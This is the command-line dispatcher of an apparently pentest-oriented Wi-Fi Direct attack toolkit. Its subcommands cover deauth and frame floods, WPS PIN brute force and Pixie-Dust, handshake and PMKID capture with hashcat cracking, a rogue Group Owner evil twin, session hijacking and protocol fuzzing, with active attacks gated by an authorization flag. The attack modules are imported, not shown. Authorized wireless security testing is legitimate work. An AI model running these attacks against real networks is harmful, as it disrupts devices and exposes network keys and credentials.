#!/usr/bin/env python3
"""DIRECTAX. Wi-Fi Direct (P2P) offensive research toolkit.

Subcommands:
  discover      Passive P2P device discovery (no injection)
  sniff         Full P2P + WSC + EAPOL capture (no injection)
  deauth        Deauth flood a P2P GO's clients (PMF-gated)
  beacon-flood  Inject synthetic P2P GO beacons
  pd-flood      Provision Discovery flood a target device
  pbc-race      WPS PBC race attack against a GO in walk-time
  wps-pin       WPS External Registrar PIN brute (reaver)
  pixie         WPS Pixie-Dust (reaver -K path)
  pixie-pcap    WPS Pixie-Dust from an existing pcap (native)
  handshake     Capture EAPOL 4-way from P2P group
  rogue-go      Stand up a rogue Group Owner (evil-twin)
  invitation    P2P Invitation Request rejoin against persistent group
  noa-starve    Notice-of-Absence starvation of P2P clients
  goneg-hijack  Race a GO-Neg-Resp with intent=15 to hijack Group Formation
  pmkid         PMKID capture for offline PSK
  cross-conn    Probe cross-connection pivot from inside a joined P2P group
  hashcat       Convert pcap and run hashcat 22000
  driver-probe  Print driver capability report for an interface
  karma         KARMA-style probe-response responder alongside rogue-GO
  nan-scan      Passive Wi-Fi Aware / NAN scanner
  miracast-fuzz Mutation fuzzer against a Miracast RTSP sink
  miracast-sink Trivial Miracast responder to observe source M4/M5
  p2p-fuzz      Protocol-aware P2P Public Action frame fuzzer
  audit         Discover targets and run every safe active check with confirmation
  novelty-check Run only the known-issue gate on an existing findings JSON
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time

# Support running from repo root without install
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "src"))

from wifidirect_pentest.banner import print_banner  # noqa: E402
from wifidirect_pentest.core import Interface, get_logger  # noqa: E402
from wifidirect_pentest.core.interface import (InterfaceError, preflight,  # noqa: E402
                                               unblock_rfkill)
from wifidirect_pentest.core.finding import (Confidence, Confirmation,  # noqa: E402
                                             Finding, Location, load_findings)
from wifidirect_pentest.core import finding_builders as fb  # noqa: E402
from wifidirect_pentest.scanners import Discovery, inspect_wps  # noqa: E402
from wifidirect_pentest.sniffers import P2PSniffer, EAPOLSniffer  # noqa: E402
from wifidirect_pentest.attacks import (BeaconFlood, DeauthFlood,  # noqa: E402
                                        HandshakeCapture, PBCRace, PixieDust,
                                        ProvisionFlood, RogueGO, WPSPinBrute,
                                        InvitationReplay, NoAStarve,
                                        GoNegHijack, PMKIDCapture,
                                        probe_cross_connection,
                                        confirmed_pivot, hashcat_crack,
                                        pixie_from_pcap)
from wifidirect_pentest.core.driver_probe import probe as probe_driver  # noqa: E402
from wifidirect_pentest.core.adapters import profile_for, readiness  # noqa: E402
from wifidirect_pentest.attacks.karma_responder import KarmaResponder  # noqa: E402
from wifidirect_pentest.fuzzers import MiracastFuzzer, MiracastSink, P2PFrameFuzzer  # noqa: E402
from wifidirect_pentest.scanners.nan import NANScanner  # noqa: E402
from wifidirect_pentest.reporting import (NoveltyGate, print_human_summary,  # noqa: E402
                                          write_run)

log = get_logger("wfdx.main")


def _require_root() -> None:
    if os.geteuid() != 0:
        print("wfdx requires root (raw sockets + iface control).", file=sys.stderr)
        sys.exit(2)


def _list_wireless_ifaces() -> list[str]:
    """Enumerate wireless interfaces via /sys/class/net."""
    import glob
    out: list[str] = []
    for p in sorted(glob.glob("/sys/class/net/*/wireless")):
        name = p.rsplit("/", 2)[-2]
        out.append(name)
    return out


def _preflight_adapters() -> None:
    ifaces = _list_wireless_ifaces()
    if not ifaces:
        print("adapters: no wireless interfaces detected")
        return
    print("adapters:")
    for name in ifaces:
        try:
            caps = probe_driver(name)
        except Exception as e:
            print(f"  {name:10} probe failed: {e}")
            continue
        prof = profile_for(caps.driver)
        ok, blockers = readiness(prof)
        modes = []
        if prof.p2p_support:
            modes.append("P2P")
        if caps.supports_active_monitor:
            modes.append("active-monitor")
        if caps.supports_5ghz:
            modes.append("5GHz")
        if caps.supports_6ghz:
            modes.append("6GHz")
        status = "READY" if ok else "LIMITED"
        print(f"  {name:10} {caps.driver or '?':12} {status:8} "
              f"{prof.display_name}")
        if modes:
            print(f"             modes: {' '.join(modes)}")
        if prof.notes:
            for n in prof.notes:
                print(f"             note:  {n}")
        for b in blockers:
            print(f"             block: {b}")


def _open_monitor(iface: str) -> tuple[Interface, str]:
    ifc = Interface.open(iface)
    if not ifc.supports_monitor():
        raise SystemExit(f"driver on {iface} does not report monitor-mode capability")
    unblock_rfkill()
    mon = ifc.to_monitor()
    return ifc, mon


def cmd_discover(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        disc = Discovery(mon, dwell_ms=args.dwell)
        devices = disc.run(duration=args.duration)
    finally:
        ifc.restore()
    result = {"devices": {mac: d.as_dict() for mac, d in devices.items()}}
    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, default=str)
    print(f"discovered {len(devices)} P2P devices")
    for mac, d in devices.items():
        wps = inspect_wps(d)
        print(f"  {mac:17}  role={d.role:4}  ssid={sorted(d.ssids)}  "
              f"ch={sorted(d.channels_seen)}  wps={wps.wps_present}  "
              f"pbc={wps.pbc_supported}  pin={wps.pin_supported}  "
              f"locked={wps.ap_setup_locked}")
    return 0


def cmd_sniff(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        p2p = P2PSniffer(mon, out_pcap=args.p2p_pcap)
        r = p2p.run(duration=args.duration)
        e = EAPOLSniffer(mon, out_pcap=args.eapol_pcap)
        e_r = e.run(duration=args.duration, bssid_filter=args.bssid)
    finally:
        ifc.restore()
    print("P2P frames:", r)
    print("EAPOL frames:", e_r)
    return 0


def _finding_or_hypothesis(f: Finding | None, hypothesis_title: str,
                           target: str, why: str) -> Finding:
    if f is not None:
        return f
    return Finding(
        title=hypothesis_title, cwe="CWE-noise",
        confidence=Confidence.HYPOTHESIS,
        target=target, attacker_position="same-LAN",
        location=Location("<unknown>", inferred=True),
        data_flow=why, trigger="see confirmation script",
        confirmation=None, evidence="no confirmation captured",
        exploit_chain="not confirmed", observable="none",
        cvss_v40_score=None, cvss_v40_vector=None,
        fix="n/a - not confirmed",
    )


def cmd_deauth(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        d = DeauthFlood(mon, args.go, args.client, count=args.count,
                        evidence_dir=args.evidence_dir)
        r = d.run(duration=args.duration)
    finally:
        ifc.restore()
    finding = fb.build_deauth_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if r.get("confirmed") else 1


def cmd_beacon_flood(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        b = BeaconFlood(mon, count=args.count, channel=args.channel,
                        name_prefix=args.name_prefix)
        r = b.run(duration=args.duration)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_pd_flood(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        p = ProvisionFlood(mon, args.target, count=args.count)
        r = p.run()
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_pbc_race(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    p = PBCRace(args.iface, args.target, walk_time=args.walk_time)
    r = p.run()
    finding = fb.build_pbc_race_finding(args.target, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_wps_pin(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        b = WPSPinBrute(mon, args.go, args.channel, evidence_dir=args.evidence_dir)
        r = b.run(session_time=args.session_time)
    finally:
        ifc.restore()
    finding = fb.build_wps_pin_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_pixie(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        p = PixieDust(mon, args.go, args.channel, evidence_dir=args.evidence_dir)
        r = p.run(timeout=args.timeout)
    finally:
        ifc.restore()
    finding = fb.build_pixie_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_handshake(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        h = HandshakeCapture(mon, args.go, args.channel,
                             evidence_dir=args.evidence_dir)
        r = h.run(duration=args.duration)
    finally:
        ifc.restore()
    finding = fb.build_handshake_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if r.get("confirmed") else 1


def cmd_rogue_go(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    r = RogueGO(args.iface, args.ssid, args.bssid, args.channel,
                device_name=args.device_name, psk=args.psk,
                sae_transition=args.sae_transition, karma=args.karma,
                evidence_dir=args.evidence_dir)
    logs = r.start()
    try:
        time.sleep(args.duration)
    finally:
        collected = r.stop_and_collect()
    signals = r.confirm_from_logs(collected)
    # A CONFIRMED rogue-GO finding needs at least the association proof.
    # Credential theft is the stronger claim and only fires when both
    # DHCPACK and captive CREDS lines are present.
    ok = signals["confirmed_evil_twin"]
    finding = fb.build_rogue_go_finding(args.ssid, args.bssid, collected, ok)
    _emit([finding] if finding else [], args)
    print(json.dumps(signals, indent=2))
    return 0 if ok else 1


def cmd_audit(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    findings: list[Finding] = []
    try:
        disc = Discovery(mon, dwell_ms=500)
        devs = disc.run(duration=args.discovery_time)
        targets = [d for d in devs.values() if d.role == "GO"]
        if args.target_mac:
            wanted = args.target_mac.lower()
            targets = [d for d in targets
                       if wanted in {d.device_addr, *d.interface_addrs, *d.bssids}]
        log.info("audit: %d GO target(s)", len(targets))
        for d in targets:
            bssid = next(iter(d.bssids), d.device_addr)
            ch = min(d.channels_seen) if d.channels_seen else 6
            wps = inspect_wps(d)

            # deauth + handshake capture
            deauth = DeauthFlood(mon, bssid, evidence_dir=args.evidence_dir)
            dr = deauth.run(duration=5.0)
            finding = fb.build_deauth_finding(bssid, dr)
            if finding:
                findings.append(finding)
            hs = HandshakeCapture(mon, bssid, ch, evidence_dir=args.evidence_dir)
            hres = hs.run(duration=20.0)
            f2 = fb.build_handshake_finding(bssid, hres)
            if f2:
                findings.append(f2)

            # pixie (only if WPS present)
            if wps.wps_present:
                px = PixieDust(mon, bssid, ch, evidence_dir=args.evidence_dir)
                pr = px.run(timeout=90.0)
                f3 = fb.build_pixie_finding(bssid, pr)
                if f3:
                    findings.append(f3)
    finally:
        ifc.restore()
    findings = NoveltyGate().apply(findings)
    _emit(findings, args)
    return 0 if findings else 1


def cmd_invitation(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        inv = InvitationReplay(mon, args.target, args.group_bssid,
                               args.group_ssid, args.channel,
                               evidence_dir=args.evidence_dir)
        r = inv.run()
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0 if r.get("confirmed") else 1


def cmd_noa(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        n = NoAStarve(mon, args.go, args.ssid, args.channel)
        r = n.run(duration=args.duration, tbtt_ms=args.tbtt_ms)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_goneg(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        g = GoNegHijack(mon, args.our_mac, op_channel=args.channel)
        r = g.wait_and_hijack(timeout=args.timeout)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0 if r.get("hijacked") else 1


def cmd_pmkid(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        pk = PMKIDCapture(mon, args.go, args.channel,
                          client_mac=args.client_mac,
                          evidence_dir=args.evidence_dir)
        r = pk.run(attempts=args.attempts)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0 if r.get("confirmed") else 1


def cmd_cross_conn(args) -> int:
    r = probe_cross_connection(args.iface, pivot_target=args.pivot_target,
                               manageability_bit=args.manageability)
    out = {
        "iface": r.p2p_iface,
        "gateway": r.gateway,
        "p2p_subnet": r.p2p_subnet,
        "manageability_forbids": r.manageability_forbids,
        "reachable": {f"{h}:{p}": v for (h, p), v in r.reachable.items()},
        "confirmed_pivot": confirmed_pivot(r),
    }
    print(json.dumps(out, indent=2))
    return 0 if out["confirmed_pivot"] else 1


def cmd_driver_probe(args) -> int:
    caps = probe_driver(args.iface)
    out = {
        "iface": caps.iface, "phy": caps.phy, "driver": caps.driver,
        "supports_monitor": caps.supports_monitor,
        "supports_active_monitor": caps.supports_active_monitor,
        "supports_p2p_go": caps.supports_p2p_go,
        "supports_p2p_client": caps.supports_p2p_client,
        "supports_p2p_device": caps.supports_p2p_device,
        "supports_5ghz": caps.supports_5ghz,
        "supports_6ghz": caps.supports_6ghz,
        "supported_ciphers": caps.supported_ciphers,
        "warnings": caps.warnings,
    }
    print(json.dumps(out, indent=2))
    return 0 if caps.supports_monitor and not caps.warnings else 1


def cmd_hashcat(args) -> int:
    r = hashcat_crack(args.pcap, args.wordlist, rules=args.rules,
                      runtime_seconds=args.runtime,
                      out_dir=args.evidence_dir)
    print(json.dumps({
        "confirmed": r.confirmed, "psk": r.psk, "ssid": r.ssid,
        "hc22000": r.hc22000_path, "hash_line": r.hash_line,
    }, indent=2))
    return 0 if r.confirmed else 1


def cmd_pixie_pcap(args) -> int:
    r = pixie_from_pcap(args.pcap, extra_flags=args.flags)
    print(json.dumps(r, indent=2))
    return 0 if r.get("confirmed") else 1


def cmd_karma(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        k = KarmaResponder(mon, args.our_bssid, args.channel,
                           ssid_denylist=args.deny)
        r = k.run(duration=args.duration)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_nan(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        n = NANScanner(mon)
        r = n.run(duration=args.duration)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_miracast_fuzz(args) -> int:
    if not args.authorized:
        raise SystemExit("--authorized required for active fuzzing")
    f = MiracastFuzzer(args.sink, port=args.port,
                       evidence_dir=args.evidence_dir)
    r = f.run(n=args.cases, seed=args.seed)
    print(json.dumps(r, indent=2))
    return 0


def cmd_miracast_sink(args) -> int:
    s = MiracastSink(host=args.host, port=args.port, log_path=args.log_path)
    s.start()
    try:
        time.sleep(args.duration)
    finally:
        s.stop()
    print(json.dumps({"log_path": args.log_path,
                      "duration_s": args.duration}, indent=2))
    return 0


def cmd_p2p_fuzz(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active fuzzing")
    ifc, mon = _open_monitor(args.iface)
    try:
        f = P2PFrameFuzzer(mon, args.target, subtypes=tuple(args.subtypes))
        r = f.run(cases_per_subtype=args.cases, seed=args.seed,
                  evidence_dir=args.evidence_dir)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0 if r.get("crash_suspects") == 0 else 2


def cmd_novelty_check(args) -> int:
    findings = load_findings(args.input)
    findings = NoveltyGate().apply(findings)
    if args.output:
        write_run(args.output, findings, {"mode": "novelty-check"})
    for f in findings:
        marker = f.novelty.known_cve or "novel"
        print(f"{f.id}  {f.title}  ->  {marker}")
    return 0


def _emit(findings: list[Finding], args) -> None:
    if args.output:
        write_run(args.output, findings, {"cli": " ".join(sys.argv)})
        print(f"wrote {args.output}")
    print_human_summary(findings, show_hypothesis=getattr(args, "show_hypothesis", False))


def _common_parser() -> argparse.ArgumentParser:
    """Shared flags accepted at either the top level or after the subcommand."""
    c = argparse.ArgumentParser(add_help=False)
    c.add_argument("--verbose", action="store_true")
    c.add_argument("--output", help="write JSON findings to path")
    c.add_argument("--show-hypothesis", action="store_true",
                   help="include LIKELY/HYPOTHESIS entries in human output")
    c.add_argument("--evidence-dir", default="evidence")
    return c


def build_parser() -> argparse.ArgumentParser:
    common = _common_parser()
    p = argparse.ArgumentParser(prog="directax", description=__doc__,
                                parents=[common],
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--preflight", action="store_true",
                   help="check required external tools and exit")

    sub = p.add_subparsers(dest="cmd")

    def _add(name: str, **kw) -> argparse.ArgumentParser:
        kw.setdefault("parents", [common])
        return sub.add_parser(name, **kw)

    d = _add("discover")
    d.add_argument("-i", "--iface", required=True)
    d.add_argument("--duration", type=float, default=60.0)
    d.add_argument("--dwell", type=int, default=500, help="ms per social channel")
    d.set_defaults(func=cmd_discover)

    s = _add("sniff")
    s.add_argument("-i", "--iface", required=True)
    s.add_argument("--duration", type=float, default=60.0)
    s.add_argument("--p2p-pcap", default="evidence/p2p.pcap")
    s.add_argument("--eapol-pcap", default="evidence/eapol.pcap")
    s.add_argument("--bssid", default=None)
    s.set_defaults(func=cmd_sniff)

    de = _add("deauth")
    de.add_argument("-i", "--iface", required=True)
    de.add_argument("--go", required=True, help="target GO BSSID")
    de.add_argument("--client", default="ff:ff:ff:ff:ff:ff")
    de.add_argument("--count", type=int, default=128)
    de.add_argument("--duration", type=float, default=5.0)
    de.add_argument("--authorized", action="store_true")
    de.set_defaults(func=cmd_deauth)

    bf = _add("beacon-flood")
    bf.add_argument("-i", "--iface", required=True)
    bf.add_argument("--count", type=int, default=30)
    bf.add_argument("--channel", type=int, default=6)
    bf.add_argument("--duration", type=float, default=15.0)
    bf.add_argument("--name-prefix", default="Fake")
    bf.add_argument("--authorized", action="store_true")
    bf.set_defaults(func=cmd_beacon_flood)

    pf = _add("pd-flood")
    pf.add_argument("-i", "--iface", required=True)
    pf.add_argument("--target", required=True)
    pf.add_argument("--count", type=int, default=500)
    pf.add_argument("--authorized", action="store_true")
    pf.set_defaults(func=cmd_pd_flood)

    pb = _add("pbc-race")
    pb.add_argument("-i", "--iface", required=True, help="managed iface (wpa_supplicant)")
    pb.add_argument("--target", required=True)
    pb.add_argument("--walk-time", type=float, default=30.0)
    pb.add_argument("--authorized", action="store_true")
    pb.set_defaults(func=cmd_pbc_race)

    wp = _add("wps-pin")
    wp.add_argument("-i", "--iface", required=True)
    wp.add_argument("--go", required=True)
    wp.add_argument("--channel", type=int, required=True)
    wp.add_argument("--session-time", type=float, default=600.0)
    wp.add_argument("--authorized", action="store_true")
    wp.set_defaults(func=cmd_wps_pin)

    px = _add("pixie")
    px.add_argument("-i", "--iface", required=True)
    px.add_argument("--go", required=True)
    px.add_argument("--channel", type=int, required=True)
    px.add_argument("--timeout", type=float, default=120.0)
    px.add_argument("--authorized", action="store_true")
    px.set_defaults(func=cmd_pixie)

    hs = _add("handshake")
    hs.add_argument("-i", "--iface", required=True)
    hs.add_argument("--go", required=True)
    hs.add_argument("--channel", type=int, required=True)
    hs.add_argument("--duration", type=float, default=30.0)
    hs.set_defaults(func=cmd_handshake)

    rg = _add("rogue-go")
    rg.add_argument("-i", "--iface", required=True)
    rg.add_argument("--ssid", required=True)
    rg.add_argument("--bssid", required=True)
    rg.add_argument("--channel", type=int, required=True)
    rg.add_argument("--device-name", default="directax-clone")
    rg.add_argument("--psk", default="directax-lab-only-1234")
    rg.add_argument("--sae-transition", action="store_true",
                    help="hostapd config supports WPA2-PSK + WPA3-SAE")
    rg.add_argument("--karma", action="store_true",
                    help="reserved: run KARMA probe responder alongside")
    rg.add_argument("--duration", type=float, default=120.0)
    rg.add_argument("--authorized", action="store_true")
    rg.set_defaults(func=cmd_rogue_go)

    au = _add("audit")
    au.add_argument("-i", "--iface", required=True)
    au.add_argument("--discovery-time", type=float, default=45.0)
    au.add_argument("--target-mac", default=None)
    au.add_argument("--authorized", action="store_true")
    au.set_defaults(func=cmd_audit)

    nc = _add("novelty-check")
    nc.add_argument("--input", required=True)
    nc.set_defaults(func=cmd_novelty_check)

    inv = _add("invitation")
    inv.add_argument("-i", "--iface", required=True)
    inv.add_argument("--target", required=True, help="target P2P Device Address")
    inv.add_argument("--group-bssid", required=True)
    inv.add_argument("--group-ssid", required=True)
    inv.add_argument("--channel", type=int, required=True)
    inv.add_argument("--authorized", action="store_true")
    inv.set_defaults(func=cmd_invitation)

    na = _add("noa-starve")
    na.add_argument("-i", "--iface", required=True)
    na.add_argument("--go", required=True, help="GO BSSID to impersonate")
    na.add_argument("--ssid", required=True)
    na.add_argument("--channel", type=int, required=True)
    na.add_argument("--duration", type=float, default=30.0)
    na.add_argument("--tbtt-ms", type=int, default=100)
    na.add_argument("--authorized", action="store_true")
    na.set_defaults(func=cmd_noa)

    gn = _add("goneg-hijack")
    gn.add_argument("-i", "--iface", required=True)
    gn.add_argument("--our-mac", required=True)
    gn.add_argument("--channel", type=int, default=6)
    gn.add_argument("--timeout", type=float, default=30.0)
    gn.add_argument("--authorized", action="store_true")
    gn.set_defaults(func=cmd_goneg)

    pm = _add("pmkid")
    pm.add_argument("-i", "--iface", required=True)
    pm.add_argument("--go", required=True)
    pm.add_argument("--channel", type=int, required=True)
    pm.add_argument("--client-mac", default="02:11:22:33:44:66")
    pm.add_argument("--attempts", type=int, default=5)
    pm.add_argument("--authorized", action="store_true")
    pm.set_defaults(func=cmd_pmkid)

    cc = _add("cross-conn")
    cc.add_argument("-i", "--iface", required=True,
                    help="joined P2P client iface (e.g. p2p-wlan0-0)")
    cc.add_argument("--pivot-target", default=None,
                    help="IP address to probe; default is P2P subnet gateway")
    cc.add_argument("--manageability", type=lambda s: int(s, 0), default=None,
                    help="P2P Manageability attr value from discovery (e.g. 0x00)")
    cc.set_defaults(func=cmd_cross_conn)

    dp = _add("driver-probe")
    dp.add_argument("-i", "--iface", required=True)
    dp.set_defaults(func=cmd_driver_probe)

    hc = _add("hashcat")
    hc.add_argument("--pcap", required=True)
    hc.add_argument("--wordlist", required=True)
    hc.add_argument("--rules", default=None)
    hc.add_argument("--runtime", type=int, default=300)
    hc.set_defaults(func=cmd_hashcat)

    pxp = _add("pixie-pcap")
    pxp.add_argument("--pcap", required=True,
                     help="pcap containing WPS M1/M2/M3")
    pxp.add_argument("--flags", nargs="*", default=None,
                     help="extra flags forwarded to pixiewps")
    pxp.set_defaults(func=cmd_pixie_pcap)

    kr = _add("karma")
    kr.add_argument("-i", "--iface", required=True)
    kr.add_argument("--our-bssid", required=True,
                    help="BSSID to advertise in probe responses")
    kr.add_argument("--channel", type=int, required=True)
    kr.add_argument("--duration", type=float, default=300.0)
    kr.add_argument("--deny", nargs="*", default=[],
                    help="SSIDs to not respond for")
    kr.add_argument("--authorized", action="store_true")
    kr.set_defaults(func=cmd_karma)

    nan = _add("nan-scan")
    nan.add_argument("-i", "--iface", required=True)
    nan.add_argument("--duration", type=float, default=60.0)
    nan.set_defaults(func=cmd_nan)

    mf = _add("miracast-fuzz")
    mf.add_argument("--sink", required=True, help="IP address of Miracast sink")
    mf.add_argument("--port", type=int, default=7236)
    mf.add_argument("--cases", type=int, default=64)
    mf.add_argument("--seed", type=int, default=None)
    mf.add_argument("--authorized", action="store_true")
    mf.set_defaults(func=cmd_miracast_fuzz)

    ms = _add("miracast-sink")
    ms.add_argument("--host", default="0.0.0.0")
    ms.add_argument("--port", type=int, default=7236)
    ms.add_argument("--duration", type=float, default=300.0)
    ms.add_argument("--log-path", default="evidence/miracast_sink.log")
    ms.set_defaults(func=cmd_miracast_sink)

    pf = _add("p2p-fuzz")
    pf.add_argument("-i", "--iface", required=True)
    pf.add_argument("--target", required=True)
    pf.add_argument("--cases", type=int, default=200)
    pf.add_argument("--seed", type=int, default=0xC0FFEE)
    pf.add_argument("--subtypes", nargs="*", type=int, default=[7, 0, 3])
    pf.add_argument("--authorized", action="store_true")
    pf.set_defaults(func=cmd_p2p_fuzz)

    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    if not os.environ.get("DIRECTAX_NO_BANNER"):
        print_banner()
    if args.verbose:
        os.environ["WFDX_LOGLEVEL"] = "DEBUG"
    if args.preflight:
        missing = preflight()
        if missing:
            print("missing:", ", ".join(missing))
        else:
            print("all required tools present")
        _preflight_adapters()
        return 1 if missing else 0
    if not getattr(args, "func", None):
        parser.print_help()
        return 2
    try:
        return args.func(args)
    except InterfaceError as e:
        print(f"error: {e}", file=sys.stderr)
        return 3


if __name__ == "__main__":
    sys.exit(main())
